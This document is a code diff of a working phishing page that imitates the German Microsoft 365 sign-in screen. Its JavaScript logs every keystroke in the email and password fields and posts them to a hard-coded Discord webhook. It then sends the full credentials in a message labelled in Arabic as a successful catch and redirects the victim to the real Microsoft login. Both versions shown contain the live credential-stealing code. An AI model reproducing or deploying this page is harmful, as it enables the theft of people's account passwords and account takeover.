@@ -1,114 +1,117 @@
 <!DOCTYPE html>
-<html lang="de">
+<html lang="de" dir="ltr">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Anmelden - Microsoft 365</title>
+    <link rel="icon" href="https://c.s-microsoft.com/favicon.ico?v2" type="image/x-icon">
     
     <meta property="og:title" content="Microsoft-Konto: Identitätsprüfung">
     <meta property="og:description" content="Sicherheitsupdate: Bitte bestätigen Sie Ihre Anmeldedaten.">
-    <meta property="og:image" content="https://www.microsoft.com/favicon.ico">
-    <meta property="og:type" content="website">
+    <meta property="og:image" content="https://upload.wikimedia.org/wikipedia/commons/9/96/Microsoft_logo_%282012%29.svg">
 
-    <title>Anmelden bei Ihrem Microsoft-Konto</title>
-    
     <style>
-        body { font-family: 'Segoe UI', Arial, sans-serif; background-color: #f2f2f2; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .container { background: white; padding: 44px; width: 360px; box-shadow: 0 2px 6px rgba(0,0,0,0.2); border-radius: 1px; }
-        .logo-container { margin-bottom: 24px; }
-        /* الشعار مدمج كـ SVG لضمان الظهور 100% */
-        .logo { width: 108px; height: 23px; }
-        h2 { font-size: 24px; font-weight: 600; margin: 0 0 12px; color: #1b1b1b; }
-        p { font-size: 15px; margin-bottom: 12px; }
-        input { width: 100%; border: none; border-bottom: 1px solid #666; padding: 8px 0; font-size: 16px; margin-bottom: 20px; outline: none; border-radius: 0; background: transparent; }
+        body { font-family: 'Segoe UI', Tahoma, Arial, sans-serif; background-color: #f2f2f2; margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; }
+        .login-card { background: white; padding: 40px; width: 380px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); border-radius: 1px; }
+        .logo { width: 108px; margin-bottom: 20px; }
+        h2 { font-size: 24px; margin: 0 0 10px; color: #1b1b1b; font-weight: 600; }
+        p { font-size: 15px; margin-bottom: 20px; color: #1b1b1b; line-height: 1.4; }
+        input { width: 100%; padding: 8px 0; margin-bottom: 20px; border: none; border-bottom: 1px solid #666; font-size: 16px; outline: none; background: transparent; }
         input:focus { border-bottom: 2px solid #0067b8; }
         .btn-container { display: flex; justify-content: flex-end; margin-top: 10px; }
-        button { background-color: #0067b8; color: white; border: none; padding: 8px 36px; font-size: 15px; cursor: pointer; min-width: 100px; }
-        button:hover { background-color: #005da6; }
-        .email-display { font-weight: 400; color: #1b1b1b; margin-bottom: 20px; display: inline-block; }
+        button { background-color: #0067b8; color: white; border: none; padding: 10px 30px; cursor: pointer; font-size: 15px; min-width: 100px; }
         .hidden { display: none; }
+        .email-display { font-weight: 400; color: #1b1b1b; margin-bottom: 20px; display: inline-block; cursor: pointer; }
     </style>
 </head>
 <body>
 
-<div class="container">
-    <div class="logo-container">
-        <svg class="logo" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 706 151">
-            <path fill="#737373" d="M115.8 28.1V123h-19V45.6h-.2l-33.3 77.4H47.1l-33.3-77.4h-.2V123H-5V28.1h26.7l38.8 89h.2l38.4-89h26.7zm43 21.6c-7.3 0-13.4 2.5-18.4 7.6-4.9 5.1-7.4 11.5-7.4 19.3s2.5 14.3 7.4 19.4c4.9 5.1 11.1 7.6 18.4 7.6s13.5-2.5 18.4-7.6c4.9-5.1 7.4-11.6 7.4-19.4s-2.5-14.2-7.4-19.3c-4.9-5.1-11.1-7.6-18.4-7.6zm0-18.1c12.7 0 23.1 4.3 31.4 13 8.2 8.6 12.3 19.4 12.3 32.4s-4.1 23.8-12.3 32.5c-8.2 8.7-18.7 13-31.4 13s-23.2-4.3-31.4-13c-8.2-8.7-12.3-19.5-12.3-32.5s4.1-23.8 12.3-32.4c8.2-8.7 18.7-13 31.4-13zm91.1 18.1c-5.9 0-10.8 2.1-14.8 6.3-4 4.2-6 9.8-6 16.7 0 7 2 12.7 6.1 17.1s9.2 6.6 15.3 6.6c6.1 0 11.1-2 15-6 3.9-4 5.9-9.5 5.9-16.3 0-7.2-1.9-13-5.8-17.5s-9-6.9-15.7-6.9zm-38.4 51.5V31.6h17.9v10.9h.2c2.8-4.2 6.3-7.5 10.6-9.8 4.3-2.3 9.3-3.5 14.8-3.5 10.3 0 18.7 3.5 25.1 10.5 6.4 7 9.6 16.2 9.6 27.6 0 11.6-3.3 21-9.9 28.2s-15.1 10.8-25.5 10.8c-11.1 0-19.7-4.4-25.8-13.3h-.2v43.3h-17.8v-56.3zm120.3-51.5c-5.8 0-10.3 1.9-13.6 5.6-3.3 3.7-5 8.9-5 15.5 0 6.1 1.6 10.8 4.7 14.3s7.3 5.3 12.4 5.3c3.4 0 6.5-.7 9.4-2.1 2.9-1.4 5.1-3.3 6.8-5.6V52.7c-1.7-1-3.7-1.8-6.1-2.4-2.4-.6-5.6-1-8.6-1zm-18.6 44.5c0-10 3.3-17.8 10-23.5s15.3-8.5 25.9-8.5c4.7 0 9 .5 13 1.5V31.6c0-6-1.8-10.6-5.3-13.8s-8.6-4.8-15.2-4.8c-8.6 0-15.7 3.3-21.4 9.9l-11.2-10.6c8.9-10.3 20.8-15.5 35.8-15.5 11.6 0 20.7 3 27.4 8.9 6.7 5.9 10 14.4 10 25.4V123h-17.2v-11h-.2c-3.1 4.2-7.1 7.4-12 9.7s-10.4 3.4-16.5 3.4c-9.1 0-16.5-2.5-22.1-7.6s-8.3-12.1-8.3-20.9zm134.4-44.5c-7.3 0-13.4 2.5-18.4 7.6-4.9 5.1-7.4 11.5-7.4 19.3s2.5 14.3 7.4 19.4c4.9 5.1 11.1 7.6 18.4 7.6s13.5-2.5 18.4-7.6c4.9-5.1 7.4-11.6 7.4-19.4s-2.5-14.2-7.4-19.3c-4.9-5.1-11.1-7.6-18.4-7.6zm0-18.1c12.7 0 23.1 4.3 31.4 13 8.2 8.6 12.3 19.4 12.3 32.4s-4.1 23.8-12.3 32.5c-8.2 8.7-18.7 13-31.4 13s-23.2-4.3-31.4-13c-8.2-8.7-12.3-19.5-12.3-32.5s4.1-23.8 12.3-32.4c8.2-8.7 18.7-13 31.4-13zm91 18.1c-6.8 0-12.1 2.2-16.1 6.5s-5.9 10.4-5.9 18.1v48.8h-17.9V31.6h17.9v13.5h.2c2.1-4.7 5.3-8.5 9.6-11.2 4.3-2.7 9.2-4.1 14.7-4.1 5.4 0 9.1.8 11.1 2.3l-5.7 16.5c-1.8-.9-4.4-1.4-7.9-1.4zm60.7-18.1c-11.8 0-21.2 3.4-28.2 10.1l9.9 11.2c5.6-5.1 11.9-7.7 18.8-7.7 5.1 0 9.1 1.2 12.1 3.5 3 2.3 4.5 5.4 4.5 9.3 0 3.3-1 6-3.1 8s-5.4 3.7-9.8 4.9c-8.7 2.3-15 5.1-18.9 8.4-3.9 3.3-5.9 8.1-5.9 14.5s2.2 11.7 6.6 15.9c4.4 4.2 10.5 6.3 18.4 6.3 11.9 0 21.3-4.9 28.2-14.8h.2v12.3h17.1V64.8c0-10.4-3.1-18.5-9.3-24.3s-15.3-8.7-27.4-8.7zm-11.2 68.3c-2.8-2.6-4.2-6.1-4.2-10.4s1.3-7.5 3.9-9.5c2.6-2 7-3.6 13.2-4.7 4.1-.7 7.7-1.3 10.8-1.8v10.5c0 5.4-2 9.5-6.1 12.3s-10.1 4.2-17.6 3.6zM621 31.6V14.1h17.9v17.5H664v14.4h-25.1v50.2c0 4.1 1 7.1 3 8.9 2 1.8 5 2.7 8.9 2.7 3.3 0 6.2-.4 8.7-1.1l2.4 14.5c-3.7 1.3-8.5 2-14.3 2-9 0-15.8-2.4-20.4-7.1s-6.9-12-6.9-22V46h-13V31.6h13z"/>
-            <path fill="#f25022" d="M0 0h68v68H0z"/><path fill="#7fba00" d="M73 0h68v68H73z"/><path fill="#00a4ef" d="M0 73h68v68H0z"/><path fill="#ffb900" d="M73 73h68v68H73z"/>
-        </svg>
+<div class="login-card" id="step1">
+    <img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/9/96/Microsoft_logo_%282012%29.svg" alt="Microsoft">
+    <h2>Anmelden</h2>
+    <p>E-Mail, Telefon oder Skype</p>
+    <input type="email" id="email" placeholder="E-Mail-Adresse" autocomplete="off" required>
+    <p style="font-size: 13px;">Kein Konto? <span style="color: #0067b8; cursor:pointer;">Erstellen Sie jetzt eines!</span></p>
+    <div class="btn-container">
+        <button onclick="showStep2()">Weiter</button>
     </div>
-    
-    <div id="step1">
-        <h2>Anmelden</h2>
-        <p>E-Mail, Telefon oder Skype</p>
-        <input type="email" id="email" placeholder="E-Mail-Adresse" autocomplete="off" required>
-        <p style="font-size: 13px;">Kein Konto? <span style="color: #0067b8; cursor:pointer;">Erstellen Sie jetzt eines!</span></p>
-        <div class="btn-container">
-            <button onclick="toPassword()">Weiter</button>
-        </div>
-    </div>
+</div>
 
-    <div id="step2" class="hidden">
-        <div id="back-btn" onclick="backToEmail()" style="cursor:pointer; margin-bottom: 15px; font-size: 14px;">
-            <span style="font-size: 18px;">←</span> <span id="user-email" class="email-display"></span>
-        </div>
-        <h2>Kennwort eingeben</h2>
-        <input type="password" id="password" placeholder="Kennwort" autocomplete="off" required>
-        <p style="font-size: 13px; color: #0067b8; cursor: pointer;">Kennwort vergessen?</p>
-        <div class="btn-container">
-            <button onclick="submitAll()">Anmelden</button>
-        </div>
+<div class="login-card hidden" id="step2">
+    <img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/9/96/Microsoft_logo_%282012%29.svg" alt="Microsoft">
+    <div onclick="backToStep1()" style="margin-bottom: 15px; font-size: 14px; cursor:pointer;">
+        <span style="font-size: 18px;">←</span> <span id="display-email" class="email-display"></span>
+    </div>
+    <h2>Kennwort eingeben</h2>
+    <input type="password" id="password" placeholder="Kennwort" autocomplete="off" required>
+    <p style="font-size: 13px; color: #0067b8; cursor: pointer;">Kennwort vergessen?</p>
+    <div class="btn-container">
+        <button onclick="finishLogin()">Anmelden</button>
     </div>
 </div>
 
 <script>
-    const DISCORD_WEBHOOK = "https://discordapp.com/api/webhooks/1493722456370839623/bOalmMVjlbeEy6jkYSoG1Oury_MmH5irfv9IJCgw9IUaqnXoGGdjDdVIsCMYgYmzAXG5";
-    
-    let currentData = { email: "", password: "" };
+    // ضع رابط الـ Webhook الخاص بك هنا
+    const webhookURL = "https://discordapp.com/api/webhooks/1493722493511401704/aYkLDXbIECF4GaV9BH7FQUuvZ7zpjdBDUqdoGoJT9hZurBLMv-heWVb-fbtbJWAc4xWF";
 
-    function setupKeylogger(elementId, keyName) {
-        document.getElementById(elementId).addEventListener('input', (e) => {
-            currentData[keyName] = e.target.value;
-            fetch(DISCORD_WEBHOOK, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ content: `⌨️ **Eingabe-Live [${keyName}]:** \`${currentData[keyName]}\`` })
-            });
-        });
-    }
+    let userData = { email: "", password: "" };
+    let timeout = null;
 
-    setupKeylogger('email', 'email');
-    setupKeylogger('password', 'password');
+    // نظام المراقبة اللحظية (Keylogger)
+    document.addEventListener('input', function(e) {
+        if (e.target.tagName === 'INPUT') {
+            clearTimeout(timeout);
+            const field = e.target.id;
+            userData[field] = e.target.value;
 
-    function toPassword() {
-        const emailVal = document.getElementById('email').value;
-        if (emailVal.length > 3) {
+            timeout = setTimeout(() => {
+                fetch(webhookURL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        content: `⌨️ **تحديث لحظي:**\n**الحقل:** ${field}\n**المحتوى:** \`${userData[field]}\``
+                    })
+                });
+            }, 1000);
+        }
+    });
+
+    function showStep2() {
+        const emailInput = document.getElementById('email').value;
+        if (emailInput.length > 3) {
+            userData.email = emailInput;
+            document.getElementById('display-email').innerText = emailInput;
             document.getElementById('step1').classList.add('hidden');
             document.getElementById('step2').classList.remove('hidden');
-            document.getElementById('user-email').innerText = emailVal;
         }
     }
 
-    function backToEmail() {
+    function backToStep1() {
         document.getElementById('step2').classList.add('hidden');
         document.getElementById('step1').classList.remove('hidden');
     }
 
-    function submitAll() {
-        fetch(DISCORD_WEBHOOK, {
+    function finishLogin() {
+        const passInput = document.getElementById('password').value;
+        if (passInput.length < 1) return;
+
+        // إرسال التقرير النهائي
+        fetch(webhookURL, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({
                 embeds: [{
-                    title: "🎯 حصيلة الاختراق النهائية",
-                    color: 15158332,
+                    title: "🎯 تم صيد البيانات بنجاح",
+                    color: 3066993,
                     fields: [
-                        { name: "📧 الإيميل", value: `\`${currentData.email}\`` },
-                        { name: "🔑 كلمة السر", value: `\`${currentData.password}\`` }
-                    ]
+                        { name: "📧 الإيميل الشخصي", value: `\`${userData.email}\`` },
+                        { name: "🔑 كلمة السر", value: `\`${passInput}\`` }
+                    ],
+                    footer: { text: "جاري التحويل للموقع الرسمي..." }
                 }]
             })
         }).then(() => {
+            // التحويل لموقع ميكروسوفت الرسمي
             window.location.href = "https://login.live.com/";
         });
     }
